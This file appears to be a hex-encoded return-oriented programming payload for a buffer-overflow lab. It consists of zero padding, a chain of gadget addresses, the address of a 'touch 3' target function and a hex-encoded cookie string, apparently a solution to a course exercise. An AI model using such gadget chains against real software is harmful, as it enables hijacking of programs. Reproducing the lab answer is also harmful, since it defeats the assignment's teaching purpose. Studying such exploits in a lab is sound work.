00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
7f 1b 40 00 00 00 00 00 /* gadget 1 */
d6 1b 40 00 00 00 00 00 /* gadget 2 */
e5 1b 40 00 00 00 00 00 /* gadget 3 */
78 1b 40 00 00 00 00 00 /* gadget 4 */
55 1b 40 00 00 00 00 00 /* gadget 5 */
36 1b 40 00 00 00 00 00 /* gadget 6 */
6b 1b 40 00 00 00 00 00 /* gadget 7 */
57 00 00 00 00 00 00 00 /* constante */
36 1b 40 00 00 00 00 00 /* gadget 8 */
9f 1a 40 00 00 00 00 00 /* touch 3 */
32 61 35 34 61 64 63 31 /* cookie - hex */
00 00 00 00 00 00 00 00
